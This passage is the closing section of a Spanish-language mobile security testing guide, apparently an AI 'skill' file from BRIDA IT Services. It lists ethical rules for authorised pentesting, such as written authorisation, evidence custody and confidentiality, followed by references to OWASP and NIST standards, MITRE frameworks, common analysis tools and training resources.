- Nunca realizar pruebas sin autorización escrita previa
- Documentar toda la cadena de custodia de evidencias
- Almacenar evidencias en medios cifrados (AES-256)
- Destruir evidencias después del período de retención acordado
- No acceder a datos personales de usuarios reales
- Reportar vulnerabilidades críticas de forma inmediata al cliente
- Mantener confidencialidad de todos los hallazgos
- Usar canales cifrados para transmitir reportes

---

## Referencias y Recursos

### Estándares y Guías
- **OWASP MASTG**: https://mas.owasp.org/MASTG/
- **OWASP Mobile Top 10**: https://owasp.org/www-project-mobile-top-10/
- **OWASP MASVS**: https://mas.owasp.org/MASVS/
- **NIST SP 800-124 Rev. 2**: Guidelines for Managing the Security of Mobile Devices
- **NIST SP 800-101 Rev. 1**: Guidelines on Mobile Device Forensics

### Frameworks
- **MITRE ATT&CK Mobile**: https://attack.mitre.org/matrices/mobile/
- **MITRE D3FEND**: https://d3fend.mitre.org/
- **NIST CSF 2.0**: https://www.nist.gov/cyberframework

### Herramientas
- **Frida**: https://frida.re/
- **Objection**: https://github.com/sensepost/objection
- **JADX**: https://github.com/skylot/jadx
- **apktool**: https://ibotpeaches.github.io/Apktool/
- **Burp Suite**: https://portswigger.net/burp
- **MobSF**: https://github.com/MobSF/Mobile-Security-Framework-MobSF
- **Ghidra**: https://ghidra-sre.org/
- **Hopper**: https://www.hopperapp.com/

### Capacitación
- **OWASP Mobile Security Testing Guide**: https://mas.owasp.org/MASTG/
- **Android Internals**: https://source.android.com/security
- **Apple Platform Security**: https://support.apple.com/guide/security/
- **SANS SEC575**: Mobile Device Security and Ethical Hacking

---

*Mobile Security Skill v2.0 — BRIDA IT Services*
*Última actualización: Junio 2025*
*Para soporte: contactar al equipo de seguridad de BRIDA IT Services*